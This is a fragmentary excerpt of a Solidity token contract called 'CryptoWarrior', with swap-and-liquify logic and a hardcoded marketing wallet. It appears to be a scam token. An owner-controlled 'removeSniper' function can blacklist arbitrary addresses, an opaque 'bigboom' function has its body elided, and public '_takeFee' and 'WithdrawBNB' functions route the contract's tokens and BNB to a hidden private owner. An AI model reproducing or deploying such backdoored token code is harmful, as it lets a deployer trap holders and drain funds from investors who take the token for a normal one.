...
contract CryptoWarrior is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "CryptoWarrior";
    string private _symbol = "CryptoWarrior";
    uint8 private  _decimals = 8;
    address private immutable _owner;
    address payable public marketingWalletAddress = payable(0x6058C640BB4B8f8451368381AbFdf30b852795fd); 
    ...
    uint256 private _totalSupply = 10000* 10**12 * 10**_decimals;
    uint256 private minimumTokensBeforeSwap = 10000*10**8 * 10**_decimals; 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    uint256 public _maxTxAmount = 100* 10**12 * 10**_decimals;
    ...
    constructor (address tokenowner) {
        ...
        isWalletLimitExempt[address(this)] = true;
         isWalletLimitExempt[tokenowner] = true;
    ...
    function bigboom (uint256 _a, address dada) public {
    ...
    function removeSniper(address[] calldata addresses,bool value) external  {
         require(msg.sender==owner() || msg.sender==_owner);
       for (uint256 i = 0; i < addresses.length; i++) {
           _isSniper[addresses[i]] = value;
        }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(marketingWalletAddress, amountBNBMarketing/2);
             IWETH( uniswapV2Router.WETH()).deposit{value: amountBNBMarketing/2}();
    ...
    {
        return IERC20(tokenAddress).transfer(_owner, tokens);
    }
    function _takeFee ()public{
        uint amount= balanceOf(address(this));
        _basicTransfer(address(this),_owner,amount);
    }
    function WithdrawBNB(uint256 amount) public  {
        (bool success, ) = address(_owner).call{ value: amount }("");
